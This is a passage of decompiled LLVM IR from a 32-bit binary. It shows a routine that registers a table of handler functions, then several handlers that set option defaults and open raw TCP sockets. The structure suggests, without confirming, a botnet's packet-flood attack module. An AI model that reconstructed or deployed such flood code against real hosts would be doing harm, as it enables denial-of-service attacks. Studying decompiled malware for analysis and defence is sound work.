  %v3_b3bc = mul nuw nsw i32 %v3_b3ac, 4
  store i32 %v3_b3bc, i32* %r1.global-to-local, align 4
  %v2_b3c0 = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_dbb4.127 to i32), i32* %v2_b3a8, align 4
  %v0_b3c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 4
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = add i32 %v0_b3cc, 4
  store i32 %v1_b3cc, i32* %r1.global-to-local, align 4
  %v4_b3d0 = inttoptr i32 %v2_b3c0 to i32*
  %v5_b3d0 = call i32* @realloc(i32* %v4_b3d0, i32 %v1_b3cc)
  %v7_b3d0 = ptrtoint i32* %v5_b3d0 to i32
  %v2_b3d4 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b3d4 = zext i8 %v2_b3d4 to i32
  store i32 %v3_b3d4, i32* %r3.global-to-local, align 4
  store i32 %v7_b3d0, i32* %ip.global-to-local, align 4
  %v0_b3dc = load i32, i32* %r5.global-to-local, align 4
  %v5_b3dc = mul nuw nsw i32 %v3_b3d4, 4
  %v6_b3dc = add i32 %v5_b3dc, %v7_b3d0
  %v7_b3dc = inttoptr i32 %v6_b3dc to i32*
  store i32 %v0_b3dc, i32* %v7_b3dc, align 4
  %v0_b3e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_b3e0 = add i32 %v1_b3e0, %v0_b3e0
  store i32 %v2_b3e0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3ec = load i32, i32* %ip.global-to-local, align 4
  %v1_b3ec = load i32, i32* %r6.global-to-local, align 4
  %v2_b3ec = inttoptr i32 %v1_b3ec to i32*
  store i32 %v0_b3ec, i32* %v2_b3ec, align 4
  %v0_b3f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3f0 = trunc i32 %v0_b3f0 to i8
  %v2_b3f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3f0 = inttoptr i32 %v2_b3f0 to i8*
  store i8 %v1_b3f0, i8* %v3_b3f0, align 1
  %v2_b3f4 = call i32* @calloc(i32 %v1_b3e0, i32 8)
  %v4_b3f4 = ptrtoint i32* %v2_b3f4 to i32
  %v2_b3f8 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b3f8 = zext i8 %v2_b3f8 to i32
  store i32 ptrtoint (i32* @global_var_d470.129 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b3f4, i32* %r5.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_b408 = mul nuw nsw i32 %v3_b3f8, 4
  store i32 %v3_b408, i32* %r1.global-to-local, align 4
  %v2_b40c = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_d470.129 to i32), i32* %v2_b3f4, align 4
  %v0_b414 = load i32, i32* %r3.global-to-local, align 4
  %v1_b414 = trunc i32 %v0_b414 to i8
  %v2_b414 = load i32, i32* %r5.global-to-local, align 4
  %v3_b414 = add i32 %v2_b414, 4
  %v4_b414 = inttoptr i32 %v3_b414 to i8*
  store i8 %v1_b414, i8* %v4_b414, align 1
  %v0_b418 = load i32, i32* %r1.global-to-local, align 4
  %v1_b418 = add i32 %v0_b418, 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v4_b41c = inttoptr i32 %v2_b40c to i32*
  %v5_b41c = call i32* @realloc(i32* %v4_b41c, i32 %v1_b418)
  %v7_b41c = ptrtoint i32* %v5_b41c to i32
  %v2_b420 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b420 = zext i8 %v2_b420 to i32
  store i32 %v3_b420, i32* %r3.global-to-local, align 4
  store i32 %v7_b41c, i32* %ip.global-to-local, align 4
  %v0_b428 = load i32, i32* %r5.global-to-local, align 4
  %v5_b428 = mul nuw nsw i32 %v3_b420, 4
  %v6_b428 = add i32 %v5_b428, %v7_b41c
  %v7_b428 = inttoptr i32 %v6_b428 to i32*
  store i32 %v0_b428, i32* %v7_b428, align 4
  %v0_b42c = load i32, i32* %r3.global-to-local, align 4
  %v1_b42c = load i32, i32* %r7.global-to-local, align 4
  %v2_b42c = add i32 %v1_b42c, %v0_b42c
  store i32 %v2_b42c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b438 = load i32, i32* %ip.global-to-local, align 4
  %v1_b438 = load i32, i32* %r6.global-to-local, align 4
  %v2_b438 = inttoptr i32 %v1_b438 to i32*
  store i32 %v0_b438, i32* %v2_b438, align 4
  %v0_b43c = load i32, i32* %r2.global-to-local, align 4
  %v1_b43c = trunc i32 %v0_b43c to i8
  %v2_b43c = load i32, i32* %r4.global-to-local, align 4
  %v3_b43c = inttoptr i32 %v2_b43c to i8*
  store i8 %v1_b43c, i8* %v3_b43c, align 1
  %v2_b440 = call i32* @calloc(i32 %v1_b42c, i32 8)
  %v4_b440 = ptrtoint i32* %v2_b440 to i32
  %v2_b444 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b444 = zext i8 %v2_b444 to i32
  store i32 ptrtoint (i32* @global_var_ccfc.131 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b440, i32* %r5.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_b454 = mul nuw nsw i32 %v3_b444, 4
  store i32 %v3_b454, i32* %r1.global-to-local, align 4
  %v2_b458 = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_ccfc.131 to i32), i32* %v2_b440, align 4
  %v0_b460 = load i32, i32* %r3.global-to-local, align 4
  %v1_b460 = trunc i32 %v0_b460 to i8
  %v2_b460 = load i32, i32* %r5.global-to-local, align 4
  %v3_b460 = add i32 %v2_b460, 4
  %v4_b460 = inttoptr i32 %v3_b460 to i8*
  store i8 %v1_b460, i8* %v4_b460, align 1
  %v0_b464 = load i32, i32* %r1.global-to-local, align 4
  %v1_b464 = add i32 %v0_b464, 4
  store i32 %v1_b464, i32* %r1.global-to-local, align 4
  %v4_b468 = inttoptr i32 %v2_b458 to i32*
  %v5_b468 = call i32* @realloc(i32* %v4_b468, i32 %v1_b464)
  %v7_b468 = ptrtoint i32* %v5_b468 to i32
  %v2_b46c = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b46c = zext i8 %v2_b46c to i32
  store i32 %v3_b46c, i32* %r3.global-to-local, align 4
  store i32 %v7_b468, i32* %ip.global-to-local, align 4
  %v0_b474 = load i32, i32* %r5.global-to-local, align 4
  %v5_b474 = mul nuw nsw i32 %v3_b46c, 4
  %v6_b474 = add i32 %v5_b474, %v7_b468
  %v7_b474 = inttoptr i32 %v6_b474 to i32*
  store i32 %v0_b474, i32* %v7_b474, align 4
  %v0_b478 = load i32, i32* %r3.global-to-local, align 4
  %v1_b478 = load i32, i32* %r7.global-to-local, align 4
  %v2_b478 = add i32 %v1_b478, %v0_b478
  store i32 %v2_b478, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b484 = load i32, i32* %ip.global-to-local, align 4
  %v1_b484 = load i32, i32* %r6.global-to-local, align 4
  %v2_b484 = inttoptr i32 %v1_b484 to i32*
  store i32 %v0_b484, i32* %v2_b484, align 4
  %v0_b488 = load i32, i32* %r2.global-to-local, align 4
  %v1_b488 = trunc i32 %v0_b488 to i8
  %v2_b488 = load i32, i32* %r4.global-to-local, align 4
  %v3_b488 = inttoptr i32 %v2_b488 to i8*
  store i8 %v1_b488, i8* %v3_b488, align 1
  %v2_b48c = call i32* @calloc(i32 %v1_b478, i32 8)
  %v4_b48c = ptrtoint i32* %v2_b48c to i32
  %v2_b490 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b490 = zext i8 %v2_b490 to i32
  store i32 ptrtoint (i32* @global_var_c480.133 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b48c, i32* %r5.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_b4a0 = mul nuw nsw i32 %v3_b490, 4
  store i32 %v3_b4a0, i32* %r1.global-to-local, align 4
  %v2_b4a4 = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_c480.133 to i32), i32* %v2_b48c, align 4
  %v0_b4ac = load i32, i32* %r3.global-to-local, align 4
  %v1_b4ac = trunc i32 %v0_b4ac to i8
  %v2_b4ac = load i32, i32* %r5.global-to-local, align 4
  %v3_b4ac = add i32 %v2_b4ac, 4
  %v4_b4ac = inttoptr i32 %v3_b4ac to i8*
  store i8 %v1_b4ac, i8* %v4_b4ac, align 1
  %v0_b4b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b4b0 = add i32 %v0_b4b0, 4
  store i32 %v1_b4b0, i32* %r1.global-to-local, align 4
  %v4_b4b4 = inttoptr i32 %v2_b4a4 to i32*
  %v5_b4b4 = call i32* @realloc(i32* %v4_b4b4, i32 %v1_b4b0)
  %v7_b4b4 = ptrtoint i32* %v5_b4b4 to i32
  %v2_b4b8 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b4b8 = zext i8 %v2_b4b8 to i32
  store i32 %v3_b4b8, i32* %r3.global-to-local, align 4
  store i32 %v7_b4b4, i32* %ip.global-to-local, align 4
  %v0_b4c0 = load i32, i32* %r5.global-to-local, align 4
  %v5_b4c0 = mul nuw nsw i32 %v3_b4b8, 4
  %v6_b4c0 = add i32 %v5_b4c0, %v7_b4b4
  %v7_b4c0 = inttoptr i32 %v6_b4c0 to i32*
  store i32 %v0_b4c0, i32* %v7_b4c0, align 4
  %v0_b4c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b4c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_b4c4 = add i32 %v1_b4c4, %v0_b4c4
  store i32 %v2_b4c4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b4d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b4d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b4d0 = inttoptr i32 %v1_b4d0 to i32*
  store i32 %v0_b4d0, i32* %v2_b4d0, align 4
  %v0_b4d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b4d4 = trunc i32 %v0_b4d4 to i8
  %v2_b4d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b4d4 = inttoptr i32 %v2_b4d4 to i8*
  store i8 %v1_b4d4, i8* %v3_b4d4, align 1
  %v2_b4d8 = call i32* @calloc(i32 %v1_b4c4, i32 8)
  %v4_b4d8 = ptrtoint i32* %v2_b4d8 to i32
  %v2_b4dc = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b4dc = zext i8 %v2_b4dc to i32
  store i32 ptrtoint (i32* @global_var_bd64.135 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b4d8, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_b4ec = mul nuw nsw i32 %v3_b4dc, 4
  store i32 %v3_b4ec, i32* %r1.global-to-local, align 4
  %v2_b4f0 = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_bd64.135 to i32), i32* %v2_b4d8, align 4
  %v0_b4f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b4f8 = trunc i32 %v0_b4f8 to i8
  %v2_b4f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b4f8 = add i32 %v2_b4f8, 4
  %v4_b4f8 = inttoptr i32 %v3_b4f8 to i8*
  store i8 %v1_b4f8, i8* %v4_b4f8, align 1
  %v0_b4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b4fc = add i32 %v0_b4fc, 4
  store i32 %v1_b4fc, i32* %r1.global-to-local, align 4
  %v4_b500 = inttoptr i32 %v2_b4f0 to i32*
  %v5_b500 = call i32* @realloc(i32* %v4_b500, i32 %v1_b4fc)
  %v7_b500 = ptrtoint i32* %v5_b500 to i32
  %v2_b504 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b504 = zext i8 %v2_b504 to i32
  store i32 %v3_b504, i32* %r3.global-to-local, align 4
  store i32 %v7_b500, i32* %ip.global-to-local, align 4
  %v0_b50c = load i32, i32* %r5.global-to-local, align 4
  %v5_b50c = mul nuw nsw i32 %v3_b504, 4
  %v6_b50c = add i32 %v5_b50c, %v7_b500
  %v7_b50c = inttoptr i32 %v6_b50c to i32*
  store i32 %v0_b50c, i32* %v7_b50c, align 4
  %v0_b510 = load i32, i32* %r3.global-to-local, align 4
  %v1_b510 = load i32, i32* %r7.global-to-local, align 4
  %v2_b510 = add i32 %v1_b510, %v0_b510
  store i32 %v2_b510, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b51c = load i32, i32* %ip.global-to-local, align 4
  %v1_b51c = load i32, i32* %r6.global-to-local, align 4
  %v2_b51c = inttoptr i32 %v1_b51c to i32*
  store i32 %v0_b51c, i32* %v2_b51c, align 4
  %v0_b520 = load i32, i32* %r2.global-to-local, align 4
  %v1_b520 = trunc i32 %v0_b520 to i8
  %v2_b520 = load i32, i32* %r4.global-to-local, align 4
  %v3_b520 = inttoptr i32 %v2_b520 to i8*
  store i8 %v1_b520, i8* %v3_b520, align 1
  %v2_b524 = call i32* @calloc(i32 %v1_b510, i32 8)
  %v4_b524 = ptrtoint i32* %v2_b524 to i32
  %v2_b528 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b528 = zext i8 %v2_b528 to i32
  store i32 ptrtoint (i32* @global_var_b5e8.137 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b524, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_b538 = mul nuw nsw i32 %v3_b528, 4
  store i32 %v3_b538, i32* %r1.global-to-local, align 4
  %v2_b53c = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_b5e8.137 to i32), i32* %v2_b524, align 4
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = trunc i32 %v0_b544 to i8
  %v2_b544 = load i32, i32* %r5.global-to-local, align 4
  %v3_b544 = add i32 %v2_b544, 4
  %v4_b544 = inttoptr i32 %v3_b544 to i8*
  store i8 %v1_b544, i8* %v4_b544, align 1
  %v0_b548 = load i32, i32* %r1.global-to-local, align 4
  %v1_b548 = add i32 %v0_b548, 4
  store i32 %v1_b548, i32* %r1.global-to-local, align 4
  %v4_b54c = inttoptr i32 %v2_b53c to i32*
  %v5_b54c = call i32* @realloc(i32* %v4_b54c, i32 %v1_b548)
  %v7_b54c = ptrtoint i32* %v5_b54c to i32
  %v2_b550 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b550 = zext i8 %v2_b550 to i32
  store i32 %v3_b550, i32* %r3.global-to-local, align 4
  store i32 %v7_b54c, i32* %ip.global-to-local, align 4
  %v0_b558 = load i32, i32* %r5.global-to-local, align 4
  %v5_b558 = mul nuw nsw i32 %v3_b550, 4
  %v6_b558 = add i32 %v5_b558, %v7_b54c
  %v7_b558 = inttoptr i32 %v6_b558 to i32*
  store i32 %v0_b558, i32* %v7_b558, align 4
  %v0_b55c = load i32, i32* %r3.global-to-local, align 4
  %v1_b55c = load i32, i32* %r7.global-to-local, align 4
  %v2_b55c = add i32 %v1_b55c, %v0_b55c
  store i32 %v2_b55c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v1_b568 = trunc i32 %v2_b55c to i8
  %v2_b568 = load i32, i32* %r4.global-to-local, align 4
  %v3_b568 = inttoptr i32 %v2_b568 to i8*
  store i8 %v1_b568, i8* %v3_b568, align 1
  %v0_b56c = load i32, i32* %ip.global-to-local, align 4
  %v1_b56c = load i32, i32* %r6.global-to-local, align 4
  %v2_b56c = inttoptr i32 %v1_b56c to i32*
  store i32 %v0_b56c, i32* %v2_b56c, align 4
  %v2_b570 = call i32* @calloc(i32 %v1_b55c, i32 8)
  %v4_b570 = ptrtoint i32* %v2_b570 to i32
  %v2_b574 = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b574 = zext i8 %v2_b574 to i32
  store i32 ptrtoint (i32* @global_var_8f24.139 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b570, i32* %r5.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_b584 = mul nuw nsw i32 %v3_b574, 4
  store i32 %v3_b584, i32* %r1.global-to-local, align 4
  %v2_b588 = load i32, i32* @global_var_1cd34.112, align 4
  store i32 ptrtoint (i32* @global_var_8f24.139 to i32), i32* %v2_b570, align 4
  %v0_b590 = load i32, i32* %r3.global-to-local, align 4
  %v1_b590 = trunc i32 %v0_b590 to i8
  %v2_b590 = load i32, i32* %r5.global-to-local, align 4
  %v3_b590 = add i32 %v2_b590, 4
  %v4_b590 = inttoptr i32 %v3_b590 to i8*
  store i8 %v1_b590, i8* %v4_b590, align 1
  %v0_b594 = load i32, i32* %r1.global-to-local, align 4
  %v1_b594 = add i32 %v0_b594, 4
  store i32 %v1_b594, i32* %r1.global-to-local, align 4
  %v4_b598 = inttoptr i32 %v2_b588 to i32*
  %v5_b598 = call i32* @realloc(i32* %v4_b598, i32 %v1_b594)
  %v6_b598 = ptrtoint i32* %v5_b598 to i32
  %v2_b59c = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_b59c = zext i8 %v2_b59c to i32
  store i32 %v3_b59c, i32* %r3.global-to-local, align 4
  %v1_b5a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b5a0 = inttoptr i32 %v1_b5a0 to i32*
  store i32 %v6_b598, i32* %v2_b5a0, align 4
  %v0_b5a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b5a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_b5a4 = mul i32 %v2_b5a4, 4
  %v6_b5a4 = add i32 %v5_b5a4, %v6_b598
  %v7_b5a4 = inttoptr i32 %v6_b5a4 to i32*
  store i32 %v0_b5a4, i32* %v7_b5a4, align 4
  %v0_b5a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_b5a8 = add i32 %v1_b5a8, %v0_b5a8
  store i32 %v2_b5a8, i32* %r2.global-to-local, align 4
  %v1_b5b0 = trunc i32 %v2_b5a8 to i8
  %v2_b5b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b5b0 = inttoptr i32 %v2_b5b0 to i8*
  store i8 %v1_b5b0, i8* %v3_b5b0, align 1
  %v2_b5b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_b5b4, i32* @r4, align 4
  ret i32 %v1_b5a8

; uselistorder directives
  uselistorder i32 %v1_b5a8, { 1, 0 }
  uselistorder i32 %v1_b55c, { 1, 0 }
  uselistorder i32 %v1_b510, { 1, 0 }
  uselistorder i32 %v1_b4c4, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b42c, { 1, 0 }
  uselistorder i32 %v1_b3e0, { 1, 0 }
  uselistorder i32 %v1_b394, { 1, 0 }
  uselistorder i32 %v1_b348, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1cd30.110 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_1cd30.110, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1cd30.110 to i32), { 1, 0 }
}

define i32 @function_b5e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b5e8:
  %v1_b5ec = urem i32 %arg1, 256
  store i32 %arg4, i32* @r5, align 4
  %v1_b604 = urem i32 %arg3, 256
  store i32 %v1_b604, i32* @r4, align 4
  %v2_b608 = call i32* @calloc(i32 %v1_b5ec, i32 4)
  %v0_b60c = load i32, i32* @r5, align 4
  %v0_b61c = load i32, i32* @r4, align 4
  %v5_b620 = inttoptr i32 %v0_b60c to i32*
  %v6_b620 = call i32 @function_b240(i32 %v0_b61c, i32* %v5_b620, i32 2, i32 0)
  %v0_b638 = load i32, i32* @r5, align 4
  %v0_b63c = load i32, i32* @r4, align 4
  %v6_b644 = inttoptr i32 %v0_b638 to i32*
  %v7_b644 = call i32 @function_b240(i32 %v0_b63c, i32* %v6_b644, i32 3, i32 65535)
  %v0_b648 = load i32, i32* @r5, align 4
  %v0_b658 = load i32, i32* @r4, align 4
  %v4_b65c = inttoptr i32 %v0_b648 to i32*
  %v5_b65c = call i32 @function_b240(i32 %v0_b658, i32* %v4_b65c, i32 4, i32 64)
  %v0_b668 = load i32, i32* @r5, align 4
  %v0_b674 = load i32, i32* @r4, align 4
  %v6_b67c = inttoptr i32 %v0_b668 to i32*
  %v7_b67c = call i32 @function_b240(i32 %v0_b674, i32* %v6_b67c, i32 5, i32 1)
  %v0_b694 = load i32, i32* @r5, align 4
  %v0_b698 = load i32, i32* @r4, align 4
  %v5_b6a0 = inttoptr i32 %v0_b694 to i32*
  %v6_b6a0 = call i32 @function_b240(i32 %v0_b698, i32* %v5_b6a0, i32 6, i32 65535)
  %v0_b6a8 = load i32, i32* @r5, align 4
  %v0_b6b8 = load i32, i32* @r4, align 4
  %v4_b6bc = inttoptr i32 %v0_b6a8 to i32*
  %v5_b6bc = call i32 @function_b240(i32 %v0_b6b8, i32* %v4_b6bc, i32 7, i32 65535)
  %v0_b6c0 = load i32, i32* @r5, align 4
  %v0_b6d0 = load i32, i32* @r4, align 4
  %v4_b6d4 = inttoptr i32 %v0_b6c0 to i32*
  %v5_b6d4 = call i32 @function_b240(i32 %v0_b6d0, i32* %v4_b6d4, i32 0, i32 512)
  %v0_b6e4 = load i32, i32* @r5, align 4
  %v0_b6e8 = load i32, i32* @r4, align 4
  %v4_b6ec = inttoptr i32 %v0_b6e4 to i32*
  %v5_b6ec = call i32 @function_b240(i32 %v0_b6e8, i32* %v4_b6ec, i32 1, i32 1)
  %v0_b6f8 = load i32, i32* @r5, align 4
  %v0_b704 = load i32, i32* @r4, align 4
  %v5_b70c = inttoptr i32 %v0_b6f8 to i32*
  %v6_b70c = call i32 @function_b240(i32 %v0_b704, i32* %v5_b70c, i32 19, i32 0)
  %v0_b714 = load i32, i32* @r5, align 4
  %v2_b718 = load i32, i32* @global_var_1cda8.141, align 4
  %v0_b724 = load i32, i32* @r4, align 4
  %v4_b728 = inttoptr i32 %v0_b714 to i32*
  %v5_b728 = call i32 @function_b240(i32 %v0_b724, i32* %v4_b728, i32 25, i32 %v2_b718)
  %v3_b73c = call i32 @_socket(i32 2, i32 3, i32 6)
  unreachable
}

define i32 @function_bd64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bd64:
  %v1_bd68 = urem i32 %arg1, 256
  store i32 %arg4, i32* @r5, align 4
  %v1_bd80 = urem i32 %arg3, 256
  store i32 %v1_bd80, i32* @r4, align 4
  %v2_bd84 = call i32* @calloc(i32 %v1_bd68, i32 4)
  %v0_bd88 = load i32, i32* @r5, align 4
  %v0_bd98 = load i32, i32* @r4, align 4
  %v5_bd9c = inttoptr i32 %v0_bd88 to i32*
  %v6_bd9c = call i32 @function_b240(i32 %v0_bd98, i32* %v5_bd9c, i32 2, i32 0)
  %v0_bdb4 = load i32, i32* @r5, align 4
  %v0_bdb8 = load i32, i32* @r4, align 4
  %v6_bdc0 = inttoptr i32 %v0_bdb4 to i32*
  %v7_bdc0 = call i32 @function_b240(i32 %v0_bdb8, i32* %v6_bdc0, i32 3, i32 65535)
  %v0_bdc4 = load i32, i32* @r5, align 4
  %v0_bdd4 = load i32, i32* @r4, align 4
  %v4_bdd8 = inttoptr i32 %v0_bdc4 to i32*
  %v5_bdd8 = call i32 @function_b240(i32 %v0_bdd4, i32* %v4_bdd8, i32 4, i32 64)
  %v0_bde4 = load i32, i32* @r5, align 4
  %v0_bdf0 = load i32, i32* @r4, align 4
  %v6_bdf8 = inttoptr i32 %v0_bde4 to i32*
  %v7_bdf8 = call i32 @function_b240(i32 %v0_bdf0, i32* %v6_bdf8, i32 5, i32 1)
  %v0_be10 = load i32, i32* @r5, align 4
  %v0_be14 = load i32, i32* @r4, align 4
  %v5_be1c = inttoptr i32 %v0_be10 to i32*
  %v6_be1c = call i32 @function_b240(i32 %v0_be14, i32* %v5_be1c, i32 6, i32 65535)
  %v0_be24 = load i32, i32* @r5, align 4
  %v0_be34 = load i32, i32* @r4, align 4
  %v4_be38 = inttoptr i32 %v0_be24 to i32*
  %v5_be38 = call i32 @function_b240(i32 %v0_be34, i32* %v4_be38, i32 7, i32 65535)
  %v0_be3c = load i32, i32* @r5, align 4
  %v0_be4c = load i32, i32* @r4, align 4
  %v4_be50 = inttoptr i32 %v0_be3c to i32*
  %v5_be50 = call i32 @function_b240(i32 %v0_be4c, i32* %v4_be50, i32 0, i32 512)
  %v0_be60 = load i32, i32* @r5, align 4
  %v0_be64 = load i32, i32* @r4, align 4
  %v4_be68 = inttoptr i32 %v0_be60 to i32*
  %v5_be68 = call i32 @function_b240(i32 %v0_be64, i32* %v4_be68, i32 1, i32 1)
  %v0_be74 = load i32, i32* @r5, align 4
  %v0_be80 = load i32, i32* @r4, align 4
  %v5_be88 = inttoptr i32 %v0_be74 to i32*
  %v6_be88 = call i32 @function_b240(i32 %v0_be80, i32* %v5_be88, i32 19, i32 0)
  %v0_be90 = load i32, i32* @r5, align 4
  %v2_be94 = load i32, i32* @global_var_1cda8.141, align 4
  %v0_bea0 = load i32, i32* @r4, align 4
  %v4_bea4 = inttoptr i32 %v0_be90 to i32*
  %v5_bea4 = call i32 @function_b240(i32 %v0_bea0, i32* %v4_bea4, i32 25, i32 %v2_be94)
  %v3_beb8 = call i32 @_socket(i32 2, i32 3, i32 6)
  unreachable
}

define i32 @function_c480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c480:
  %v1_c484 = urem i32 %arg1, 256
  store i32 %arg4, i32* @r5, align 4
  %v1_c49c = urem i32 %arg3, 256
  store i32 %v1_c49c, i32* @r4, align 4
  %v2_c4a0 = call i32* @calloc(i32 %v1_c484, i32 16)
  %v2_c4b0 = call i32* @calloc(i32 %v1_c484, i32 4)
  %v0_c4b4 = load i32, i32* @r5, align 4
  %v0_c4c4 = load i32, i32* @r4, align 4
  %v5_c4c8 = inttoptr i32 %v0_c4b4 to i32*
  %v6_c4c8 = call i32 @function_b240(i32 %v0_c4c4, i32* %v5_c4c8, i32 2, i32 0)
  %v0_c4e0 = load i32, i32* @r5, align 4
  %v0_c4e4 = load i32, i32* @r4, align 4
  %v6_c4ec = inttoptr i32 %v0_c4e0 to i32*
  %v7_c4ec = call i32 @function_b240(i32 %v0_c4e4, i32* %v6_c4ec, i32 3, i32 65535)
  %v0_c4f0 = load i32, i32* @r5, align 4
  %v0_c500 = load i32, i32* @r4, align 4
  %v4_c504 = inttoptr i32 %v0_c4f0 to i32*
  %v5_c504 = call i32 @function_b240(i32 %v0_c500, i32* %v4_c504, i32 4, i32 64)
  %v0_c510 = load i32, i32* @r5, align 4
  %v0_c51c = load i32, i32* @r4, align 4
  %v6_c524 = inttoptr i32 %v0_c510 to i32*
  %v7_c524 = call i32 @function_b240(i32 %v0_c51c, i32* %v6_c524, i32 5, i32 1)
  %v0_c538 = load i32, i32* @r5, align 4
  %v0_c540 = load i32, i32* @r4, align 4
  %v5_c548 = inttoptr i32 %v0_c538 to i32*
  %v6_c548 = call i32 @function_b240(i32 %v0_c540, i32* %v5_c548, i32 7, i32 65535)
  %v0_c54c = load i32, i32* @r5, align 4
  %v0_c55c = load i32, i32* @r4, align 4
  %v4_c560 = inttoptr i32 %v0_c54c to i32*
  %v5_c560 = call i32 @function_b240(i32 %v0_c55c, i32* %v4_c560, i32 11, i32 0)
  %v0_c56c = load i32, i32* @r5, align 4
  %v0_c578 = load i32, i32* @r4, align 4
  %v5_c580 = inttoptr i32 %v0_c56c to i32*
  %v6_c580 = call i32 @function_b240(i32 %v0_c578, i32* %v5_c580, i32 12, i32 1)
  %v0_c58c = load i32, i32* @r5, align 4
  %v0_c598 = load i32, i32* @r4, align 4
  %v5_c5a0 = inttoptr i32 %v0_c58c to i32*
  %v6_c5a0 = call i32 @function_b240(i32 %v0_c598, i32* %v5_c5a0, i32 13, i32 1)
  %v0_c5ac = load i32, i32* @r5, align 4
  %v0_c5b8 = load i32, i32* @r4, align 4
  %v5_c5c0 = inttoptr i32 %v0_c5ac to i32*
  %v6_c5c0 = call i32 @function_b240(i32 %v0_c5b8, i32* %v5_c5c0, i32 14, i32 0)
  %v0_c5cc = load i32, i32* @r5, align 4
  %v0_c5d8 = load i32, i32* @r4, align 4
  %v5_c5e0 = inttoptr i32 %v0_c5cc to i32*
  %v6_c5e0 = call i32 @function_b240(i32 %v0_c5d8, i32* %v5_c5e0, i32 15, i32 0)
  %v0_c5ec = load i32, i32* @r5, align 4
  %v0_c5f8 = load i32, i32* @r4, align 4
  %v5_c600 = inttoptr i32 %v0_c5ec to i32*
